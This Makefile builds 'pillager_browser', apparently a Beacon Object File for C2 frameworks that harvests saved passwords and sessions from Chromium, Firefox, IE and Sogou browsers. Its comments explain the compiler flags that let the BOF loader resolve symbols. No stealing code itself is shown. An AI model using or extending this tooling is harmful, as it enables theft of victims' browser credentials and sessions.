# pillager_browser — 完整 Chromium 系浏览器 + Firefox(SQLite 部分)
# mask: 位1=Chromium 位2=Firefox（默认全 FFFFFFFF）
CC_X64 ?= x86_64-w64-mingw32-gcc
OBJS = plg_main.o plg_sqlite.o plg_crypto.o plg_chromium.o plg_firefox.o plg_ffox_pw.o plg_sess.o plg_ie.o plg_oldsogou.o

# -mno-stack-arg-probe：避免生成 ___chkstk_ms，Beacon BOF 加载器无法解析该 MinGW 运行时符号
# -fno-stack-protector：减少对 CRT 辅助符号的依赖
CFLAGS = -DBOF -c -O2 -fno-asynchronous-unwind-tables -fno-stack-protector -mno-stack-arg-probe \
	-Wno-unused-parameter -Wdiscarded-qualifiers -Wincompatible-pointer-types

all: pillager_browser.x64.o

$(OBJS): %.o: %.c plg_common.h beacon.h adaptix.h
	$(CC_X64) $(CFLAGS) -o $@ $<

pillager_browser.x64.o: $(OBJS)
	$(CC_X64) -nostdlib -Wl,-r -o $@ $(OBJS)
	x86_64-w64-mingw32-strip --strip-unneeded $@ 2>/dev/null || true

clean:
	rm -f $(OBJS) pillager_browser.x64.o

.PHONY: all clean
